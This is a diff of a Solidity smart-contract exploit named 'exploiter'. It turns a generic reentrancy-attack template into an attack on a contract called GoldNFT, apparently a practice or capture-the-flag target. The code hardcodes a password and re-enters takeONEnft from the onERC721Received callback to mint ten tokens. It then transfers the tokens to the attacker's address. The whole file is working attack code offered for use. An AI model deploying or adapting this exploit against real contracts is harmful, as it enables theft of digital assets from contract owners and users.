@@ -1,37 +1,41 @@
-
-// Description:
-// A template for a reentrancy attack on the vulnerable safeMint_ functionality of ERC721
-
-// How to use:
-// 1. Change the ./Target.sol import to the path to the code of your target
-// 2. Implement additional functionalities / adapt the parameters
-// 3. Deploy the contract and call attack();
-
 // SPDX-License-Identifier: UNLICENSED
 
 pragma solidity ^0.8.0;
 
+import "./GoldNFT.sol";
+
 contract exploiter {
-    int claims;
-    address NFT_contract;
+    uint256 claims;
+    GoldNFT NFT_contract;
+    bytes32 password = 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe;
+    uint256 target_claims = 10;
+    address owner;
+    uint256[] public tokenIds;
 
     constructor(address target_addr)
     {
+        owner = msg.sender;
         claims = 0; 
-        NFT_contract = target_addr;
+        NFT_contract = GoldNFT(target_addr);
     }
 
     function attack() payable public
     {
-        NFT_contract.call("takeONEnft(bytes32)", bytes32(0x89cc2652e31add2270f7ce9c3c69ce903558b7a053665c92e066089aece0ccb6));
+        NFT_contract.takeONEnft(password);
+
+        for (uint256 i = 0; i < target_claims; i++)
+        {
+            NFT_contract.transferFrom(address(this), owner, tokenIds[i]);
+        }
     }
 
     function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4)
     {
-        if (claims < 10)
+        tokenIds.push(tokenId);
+        if (claims < target_claims)
         {
             claims += 1;
-            NFT_contract.claim();
+            NFT_contract.takeONEnft(password);
         }
 
         return this.onERC721Received.selector;
